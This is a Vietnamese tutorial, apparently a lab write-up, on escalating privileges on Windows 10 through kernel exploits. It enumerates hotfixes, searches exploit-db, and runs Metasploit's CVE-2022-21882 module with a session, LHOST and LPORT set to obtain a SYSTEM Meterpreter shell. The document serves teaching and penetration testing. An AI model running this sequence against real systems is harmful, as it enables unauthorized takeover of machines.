# Khai thác hạt nhân cho hệ điều hành Windows hiện đại

## Săn lùng lỗ hổng hạt nhân

Trong ví dụ này, chúng tôi đã có được chỗ đứng trên máy Windows10 với tư cách là người dùng tiêu chuẩn **bob** .

![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/92b5f50b-14f5-4a12-8745-a57f72415cc6)

## Enumerating Kernel Exploits – Manual Method

Cũng giống như bài trước, điều đầu tiên chúng ta cần làm là sử dụng lệnh **systeminfo** để tìm phiên bản hệ điều hành, kiến trúc và quan trọng nhất là các hotfix (KB) đã được cài đặt.

![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/95bdaabf-2949-4b5f-a554-fb32c9afec54)

Ở đây chúng ta có thể thấy đây là hệ thống Windows 10 Pro – Build 18362 (version 1903) – x64 (64-bit). Chúng ta cũng có thể thấy rằng có hai hotfix được cài đặt trên máy chủ này.
Để thu thập thông tin về các hotfix được cài đặt trên máy chủ, chúng ta có thể sử dụng lệnh wmic sau :

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/dabe3597-67dc-4a67-bf97-268352cf6cd6)

Ngày cài đặt hotfix rất quan trọng và chỉ ra rằng mục tiêu dễ bị tấn công bởi bất kỳ hoạt động khai thác kernel nào được phát hiện sau ngày này, miễn là phiên bản Windows 10 này bị ảnh hưởng.

Microsoft không còn sử dụng các số bản tin MS như “MS17-010” cho các lỗ hổng được tiết lộ của họ. Kể từ cuối năm 2017/đầu năm 2018, Microsoft hiện sử dụng số CVE liên quan đến lỗ hổng bảo mật. Điều này có nghĩa là đối với các hoạt động khai thác kernel hiện đại, chúng ta sẽ thấy rằng tất cả chúng đều được gắn nhãn là CVE-20XX-XXXX.

Để bắt đầu, chúng tôi có thể Google hai bản sửa lỗi đã cài đặt để xem chúng vá những lỗ hổng nào. Từ đó, chúng tôi sẽ biết mục tiêu của chúng tôi KHÔNG dễ bị tổn thương. Điều này có nghĩa là mọi hoạt động khai thác đối với phiên bản Windows cụ thể này (1903) được phát hiện sau ngày cập nhật hotfix sẽ hoạt động.

Một lần nữa, kỹ thuật này chỉ hoạt động khả thi nếu cài đặt ít hotfix nhất.

## Enumerating Kernel Exploits – Tools

Chúng ta có thể tìm kiếm các cách khai thác bằng cách sử dụng lệnh searchsploit và sau đó sử dụng cách khai thác tích hợp cho một lỗ hổng cụ thể.

Ví dụ: chúng ta có thể sử dụng lệnh sau để xem liệu có bất kỳ cách khai thác nào đối với phiên bản Windows này hay không.

```
searchsploit 1903
```
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/134c448e-89d3-4e06-9dc7-375fe7ecfd7d)

Từ đây, chúng ta có thể thấy rằng đây đều là các tệp TXT, có thể sẽ có một liên kết bên trong chúng tới kho lưu trữ GitHub có chứa phần khai thác để sử dụng. Chúng ta có thể sao chép các tệp này vào thư mục của mình hoặc vì chúng là tệp TXT, chúng ta chỉ cần sử dụng lệnh định vị để tìm đường dẫn đầy đủ rồi cat tệp. Ví dụ:

```
locate 48267.txt
```
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/ffa7c236-9825-45d0-9204-3d4d5b836bde)

```
cat /usr/share/exploitdb/exploits/windows/local/48267.txt
```
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/54e4f7ce-07ce-4c5e-8393-2e16b4305e4c)

Trong tệp TXT chúng ta có thể thấy đây là CVE-2020-0796. Điều này có nghĩa là cách khai thác này mới hơn bản vá mới nhất của mục tiêu và do đó, đây sẽ là một cách khai thác mà chúng tôi có thể sử dụng để nâng cấp lên HỆ THỐNG

## Testing Kernel Exploits and Elevating Privileges to Administrator / SYSTEM
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/42ad56d0-fe82-48e0-a6b9-50f01f9eaebe)

Chúng ta có thể thấy phiên 1 đã mở, điều quan trọng cần lưu ý là chúng ta cần giữ lại số phiên này.

Metasploit có khá nhiều mô-đun để khai thác kernel hiện đại; tuy nhiên, khi chúng tôi cố gắng sử dụng Local Exploit Suggester như chúng tôi đã làm ở bài đăng trước, nó sẽ không mang lại nhiều lợi ích cho chúng tôi.

Thay vào đó, chúng ta có thể sử dụng lệnh nền để thoát khỏi phiên đo lường và sau đó sử dụng lệnh sau để liệt kê các cách khai thác CVE khác nhau hiện có:

```
search exploit/windows/local/cve
```
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/e2f591c3-1bea-447b-8f60-eba433fe097f)

Tìm kiếm không bao gồm TẤT CẢ các lần khai thác kernel, đó là do Metasploit đã đặt tên một số trong số chúng bằng tên 'phương tiện' chứ không phải số CVE của chúng. Ví dụ: chúng ta có thể thấy SMBGhost có trong danh sách ở đây nhưng COMahawk thì không.

Điều này cung cấp một điểm khởi đầu tốt để chúng tôi thử nghiệm các hoạt động khai thác. Chúng ta có thể bắt đầu bằng cách tham chiếu chéo kết quả đầu ra của Watson và thử nghiệm các hoạt động khai thác xuất hiện trong lần quét đó, chẳng hạn như CVE-2020-0668 và SMBGhost.

Ngoài ra, chúng tôi có thể kiểm tra COMahwk bằng cách tìm kiếm nó theo tên. Tuy nhiên, chúng ta đã thấy cả SMBGhost và COMahawk đều bị khai thác, vì vậy hãy cùng xem một cách khai thác kernel thực sự tốt ảnh hưởng đến rất nhiều phiên bản Windows 10 hiện đại.

```
use exploit/windows/local/cve_2022_21882_win32k
```
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/c0e3f623-6edc-4d07-b29b-56c8d022e497)

Chúng ta sẽ cần đặt các giá trị SESSION, LHOST và LPORT cho việc này; tuy nhiên, hãy nhanh chóng xem xét tất cả các phiên bản Windows 10 bị ảnh hưởng.

![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/d27138e0-07a4-449c-bc04-b9f1de0eb959)

Ồ! Điều này ảnh hưởng đến hầu hết mọi phiên bản Windows 10, cho đến phiên bản mới nhất và cuối cùng trước Windows 11!
Được rồi, bây giờ chúng ta chỉ cần thêm thông tin chi tiết của mình vào khai thác:

```
set SESSION 1
set LHOST 172.16.1.30
set LPORT 8080
show options
```
![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/b72bca40-487f-41df-b912-ac06db903ff5)

Bây giờ mọi thứ đã được thiết lập, chúng ta có thể sử dụng lệnh khai thác và sau đó chúng ta sẽ thấy phiên kiểm tra thứ hai dưới dạng HỆ THỐNG.

![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/5b048fd6-a55e-47d1-84d1-641428656a5e)

